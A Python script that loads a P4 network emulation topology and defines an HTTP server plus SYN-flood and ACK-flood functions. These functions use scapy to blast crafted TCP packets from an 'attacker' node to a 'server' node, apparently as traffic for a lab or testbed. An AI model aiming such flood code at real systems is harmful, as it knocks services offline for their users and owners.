import http.server
import socketserver
from scapy.all import IP, TCP, send, Ether, sendp
import time
from p4utils.utils.helper import load_topo
import os

script_dir = os.path.dirname(__file__)
topo = load_topo(os.path.join(script_dir, "topology.json"))
nodes = topo.get_nodes()
# print(nodes)


def start_http_server(port=8081):
    """Starts a simple HTTP server (blocking mode)."""
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"🚀 HTTP Server running on port {port}...")
        httpd.serve_forever()  # This blocks execution


def ack_flood_attack(duration=1, dport=8081, attacker_n="attacker", victim_n="server", switch_mac="00:01:0a:00:01:02"):
    """Sends a ACK flood attack from the attacker to the server via the switch."""

    # Extract network details
    attacker_ip = nodes[attacker_n]['ip'].split('/')[0]  # Remove subnet mask
    attacker_mac = nodes[attacker_n]['mac']
    server_ip = nodes[victim_n]['ip'].split('/')[0]
    # Use switch MAC if not provided
    switch_mac = switch_mac or nodes['s1']['mac']

    print(
        f"🚀 ACK Flood Attack: {attacker_ip} -> {server_ip}:{dport} via {switch_mac}")

    # Attack loop for the given duration
    start_time = time.time()

    ack_flood_pkt = (
        Ether(dst=switch_mac, src=attacker_mac, type=0x0800) /
        IP(src=attacker_ip, dst=server_ip, ttl=64, proto=6) /
        TCP(sport=1024, dport=dport, flags="A", seq=1000)
    )
    while time.time() - start_time < duration:

        sendp(ack_flood_pkt, verbose=False)  # Replace with correct interface

    print("✅ ACK Flood Attack Completed!")


def syn_flood_attack(duration=1, dport=8081, attacker_n="attacker", victim_n="server", switch_mac="00:01:0a:00:01:02"):
    """Sends a SYN flood attack from the attacker to the server via the switch."""

    # Extract network details
    attacker_ip = nodes[attacker_n]['ip'].split('/')[0]  # Remove subnet mask
    attacker_mac = nodes[attacker_n]['mac']
    server_ip = nodes[victim_n]['ip'].split('/')[0]
    # Use switch MAC if not provided
    switch_mac = switch_mac or nodes['s1']['mac']
    print(f"attacker_ip: {attacker_ip}")
    print(f"attacker_mac: {attacker_mac}")
    print(f"server_ip: {server_ip}")
    print(f"switch_mac: {switch_mac}")

    print(
        f"🚀 SYN Flood Attack: {attacker_ip} -> {server_ip}:{dport} via {switch_mac}")

    # Attack loop for the given duration
    start_time = time.time()

    syn_flood_pkt = (
        Ether(dst=switch_mac, src=attacker_mac, type=0x0800) /
        IP(src=attacker_ip, dst=server_ip, ttl=64, proto=6) /
        TCP(sport=1024, dport=dport, flags="S", seq=1000)
    )
    while time.time() - start_time < duration:

        sendp(syn_flood_pkt, verbose=False)  # Replace with correct interface

    print("✅ SYN Flood Attack Completed!")